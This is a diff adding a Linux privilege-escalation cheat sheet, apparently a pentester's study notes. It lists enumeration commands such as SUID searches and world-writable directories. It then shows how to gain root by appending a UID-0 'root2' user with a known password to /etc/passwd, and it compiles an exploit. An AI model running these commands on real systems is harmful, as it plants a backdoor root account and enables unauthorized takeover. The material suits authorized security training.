@@ -1,0 +1,60 @@
+#!/usr/bin/peno
+
+# Getting the version of the running operating system and architecture
+cat /etc/issue
+cat /etc/*-release
+uname -a
+
+#Getting a list of running processes on Linux
+ps axu
+
+#Inspecting the cron log file
+grep "CRON" /var/log/cron.log
+
+#Listing the full TCP/IP configuration on all available adapters on Linux
+ip a
+
+#Printing the routes on Linux
+/sbin/route
+
+#Listing all active network connections on Linux
+ss -anp
+
+# Listing all cron jobs on Linux
+ls -lah /etc/cron*
+cat /etc/crontab
+
+# Listing all installed packages on a Debian Linux operating system
+dpkg -l
+
+#Listing all world writable directories on Linux
+find / -writable -type d 2>/dev/null
+
+#Listing content of /etc/fstab and all mounted drives on Linux
+cat /etc/fstab
+mount
+
+#Listing all available drives using lsblk on Linux
+/bin/lsblk
+
+#Listing loaded drivers on Linux
+lsmod
+
+#Listing additional information about a module on Linux
+/sbin/modinfo libata
+
+# Searching for SUID files on Linux
+find / -perm -u=s -type f 2>/dev/null
+
+#Tools
+#https://pentestmonkey.net/tools/audit/unix-privesc-check
+./unix-privesc-check standard > output.txt
+
+#Escalating privileges by editing /etc/passwd
+openssl passwd evil -->Output: AK24fcSx2Il3I
+echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd
+su root2 --> Root
+
+#Code-GCC Compile
+gcc 43418.c -o exploit
+
